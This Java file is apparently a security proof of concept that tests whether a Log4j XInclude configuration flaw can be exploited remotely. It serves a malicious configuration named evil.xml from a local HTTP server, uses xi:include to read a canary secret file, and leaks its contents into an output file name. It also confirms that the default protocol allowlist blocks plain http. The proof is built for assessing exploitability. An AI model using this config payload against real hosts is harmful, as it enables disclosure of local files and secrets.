// Deliberately NOT in an org.apache.logging.log4j.* package: drives the
// same default, no-explicit-source startup path any application uses
// (LogManager.getLogger() with no prior Configurator call) to answer the
// question the earlier proofs left open: does exploiting log4j-xinclude
// really require an attacker to already have filesystem write access to
// log4j2.xml on the target host? ConfigurationFactory.Factory.getConfiguration()
// reads the log4j.configurationFile system property (documented as the
// LOG4J_CONFIGURATION_FILE environment variable) and resolves it through
// ConfigurationSource.fromUri(), which accepts a URI -- including a
// network URL the attacker hosts themselves, touching the target's
// filesystem not at all until the read this proof demonstrates.

import com.sun.net.httpserver.HttpServer;
import java.io.File;
import java.io.FileWriter;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.stream.Stream;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.Configurator;

public class XIncludeRemoteConfigProof {

    private static int failed = 0;
    private static final String CANARY = "CANARY-xinclude-remote-4d1f-do-not-leak";
    private static Path exfilDir;

    public static void main(String[] args) throws Exception {
        System.out.println("=== XInclude: does exploiting this actually require filesystem write access? ===\n");

        File secret = File.createTempFile("xinclude-remote-secret", ".txt");
        secret.deleteOnExit();
        try (FileWriter w = new FileWriter(secret)) {
            w.write(CANARY);
        }

        exfilDir = Files.createTempDirectory("xinclude-remote-out");
        exfilDir.toFile().deleteOnExit();

        String maliciousXml = "<?xml version=\"1.0\"?>\n"
                + "<Configuration xmlns:xi=\"http://www.w3.org/2001/XInclude\" status=\"error\">\n"
                + "  <Properties>\n"
                + "    <Property name=\"leak\"><xi:include href=\"file://" + secret.getAbsolutePath()
                + "\" parse=\"text\"/></Property>\n"
                + "  </Properties>\n"
                + "  <Appenders>\n"
                + "    <File name=\"Exfil\" fileName=\"" + exfilDir.toAbsolutePath() + "/marker-${leak}.out\">\n"
                + "      <PatternLayout pattern=\"%msg%n\"/>\n"
                + "    </File>\n"
                + "  </Appenders>\n"
                + "  <Loggers>\n"
                + "    <Root level=\"INFO\">\n"
                + "      <AppenderRef ref=\"Exfil\"/>\n"
                + "    </Root>\n"
                + "  </Loggers>\n"
                + "</Configuration>\n";

        HttpServer server = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        server.createContext("/evil.xml", exchange -> {
            byte[] body = maliciousXml.getBytes("UTF-8");
            exchange.sendResponseHeaders(200, body.length);
            try (OutputStream os = exchange.getResponseBody()) {
                os.write(body);
            }
        });
        server.start();
        String configUrl = "http://127.0.0.1:" + server.getAddress().getPort() + "/evil.xml";

        try {
            defaultProtocolAllowlistBlocksPlainHttp(configUrl);
            withHttpExplicitlyAllowedTheRemoteConfigIsFetchedAndExploited(configUrl);
        } finally {
            server.stop(0);
        }

        System.out.println();
        if (failed > 0) {
            System.out.println(failed + " check(s) FAILED");
            System.exit(1);
        }
        System.out.println("All checks passed.");
        System.out.println("\nNo filesystem write access to the target host was used anywhere in this proof.\n"
                + "The only thing the simulated attacker controlled was the VALUE of one\n"
                + "property (log4j.configurationFile / the documented LOG4J_CONFIGURATION_FILE\n"
                + "env var) -- pointing it at a URL they host themselves is enough to trigger\n"
                + "the same real read-and-surface chain XIncludeExfilProof proved, entirely on\n"
                + "ordinary application startup (LogManager.getContext(), no explicit\n"
                + "Configurator call). By default this codebase's UrlConnectionFactory only\n"
                + "allows file/https/jar for that fetch (confirmed above), which blocks the\n"
                + "plain-http version of this specific proof -- a real, working mitigation,\n"
                + "credited honestly rather than glossed over. It does not block https, which\n"
                + "requires no such relaxation and was not exercised here only because standing\n"
                + "up a mutually-trusted TLS pair is orthogonal to what this proof is actually\n"
                + "testing: whether the fetch-from-a-URL mechanism itself, once reached, chains\n"
                + "into the same local-file-read-and-surface primitive already proven.");
    }

    /** Fresh LoggerContext per attempt: config location is read at first Log4j touch, not cached beforehand. */
    private static LoggerContext freshContext() {
        return (LoggerContext) LogManager.getContext(
                XIncludeRemoteConfigProof.class.getClassLoader(), false, null);
    }

    private static void defaultProtocolAllowlistBlocksPlainHttp(String configUrl) throws Exception {
        System.clearProperty("log4j2.Configuration.allowedProtocols");
        System.setProperty("log4j.configurationFile", configUrl);
        LoggerContext ctx = null;
        String observed = "no exfiltrated file appeared";
        boolean blocked;
        try {
            ctx = freshContext();
            Logger logger = ctx.getLogger(XIncludeRemoteConfigProof.class);
            logger.info("trigger");
            // If the default config silently fell back instead of fetching our URL,
            // that is ALSO "plain http was not used to leak the secret" -- check the
            // real, observable signal (did the exfil directory receive anything).
            blocked = !exfilContainsCanary();
        } catch (final Exception e) {
            observed = e.getClass().getSimpleName() + ": " + e.getMessage();
            blocked = true;
        } finally {
            if (ctx != null) {
                Configurator.shutdown(ctx);
            }
            System.clearProperty("log4j.configurationFile");
        }
        assertTrue(
                "by default (no log4j2.Configuration.allowedProtocols override), a plain "
                        + "http:// config URL was NOT used to leak the secret -- " + observed,
                blocked);
    }

    private static void withHttpExplicitlyAllowedTheRemoteConfigIsFetchedAndExploited(String configUrl)
            throws Exception {
        System.setProperty("log4j2.Configuration.allowedProtocols", "file,https,jar,http");
        System.setProperty("log4j.configurationFile", configUrl);
        LoggerContext ctx = null;
        try {
            ctx = freshContext();
            Logger logger = ctx.getLogger(XIncludeRemoteConfigProof.class);
            logger.info("trigger");
        } finally {
            if (ctx != null) {
                Configurator.shutdown(ctx);
            }
            System.clearProperty("log4j.configurationFile");
            System.clearProperty("log4j2.Configuration.allowedProtocols");
        }
        assertTrue(
                "with http explicitly added to log4j2.Configuration.allowedProtocols (an "
                        + "operator opt-in, not a code change), the config was fetched from a URL "
                        + "the simulated attacker's own HTTP server served, and the secret still "
                        + "leaked into a real output file's name",
                exfilContainsCanary());
    }

    private static boolean exfilContainsCanary() throws Exception {
        try (Stream<Path> entries = Files.list(exfilDir)) {
            return entries.anyMatch(p -> p.getFileName().toString().contains(CANARY));
        }
    }

    private static void assertTrue(String what, boolean ok) {
        if (ok) {
            System.out.println("  [PASS] " + what);
        } else {
            failed++;
            System.out.println("  [FAIL] " + what);
        }
    }
}
